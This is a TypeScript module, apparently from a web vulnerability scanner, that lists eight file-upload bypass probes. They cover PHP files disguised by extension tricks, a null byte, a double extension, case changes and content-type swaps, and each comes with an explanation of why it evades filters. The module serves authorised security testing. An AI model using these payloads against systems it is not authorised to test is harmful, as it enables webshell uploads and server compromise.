import type { PayloadVariant } from '../types';

export const META = {
  id: 'file-upload-rules',
  family: 'command-injection' as const,
  name: 'File Upload Extension / Content-Type Bypass',
  description: 'Probes file upload endpoints with extension confusion, polyglot files, and null byte injection to bypass upload restrictions.',
  defaultRisk: 'none' as const,
  insertionPointKinds: ['multipart', 'body'],
};

const PROBES = [
  { value: 'filename="shell.php"; Content-Type: image/jpeg', intent: '.php extension disguised as JPEG content-type — bypass extension-only filtering', signals: ['file-upload-bypass'] },
  { value: 'filename="shell.php5"', intent: '.php5 extension probe — bypasses blocklists that only block .php', signals: ['file-upload-bypass'] },
  { value: 'filename="shell.phtml"', intent: '.phtml extension probe — Apache executes as PHP, often missing from blocklists', signals: ['file-upload-bypass'] },
  { value: 'filename="shell.php.jpg"', intent: 'Double extension .php.jpg — bypasses last-extension-wins validators', signals: ['file-upload-bypass'] },
  { value: 'filename="shell.php\x00.jpg"', intent: 'Null byte in filename — C-based parsers truncate at \\x00, executing as .php', signals: ['file-upload-bypass'] },
  { value: 'filename="shell.jpg"; Content-Type: application/x-php', intent: 'Polyglot JPEG+PHP content-type swap — .jpg extension with PHP content-type', signals: ['file-upload-bypass'] },
  { value: 'filename="shell.PHP"', intent: 'Uppercase .PHP extension — bypasses case-sensitive blocklist entries', signals: ['file-upload-bypass'] },
  { value: 'filename="shell.php%20"', intent: 'Trailing space in extension — some validators strip but filesystem preserves', signals: ['file-upload-bypass'] },
];

export function variants(): PayloadVariant[] {
  return PROBES.map((p, i) => ({
    id: `file-upload-${i + 1}`,
    family: 'command-injection' as const,
    value: p.value,
    encoding: 'raw' as const,
    intent: p.intent,
    requiresOast: false,
    requiresBrowser: false,
    destructiveRisk: 'none' as const,
    expectedSignals: p.signals,
  }));
}
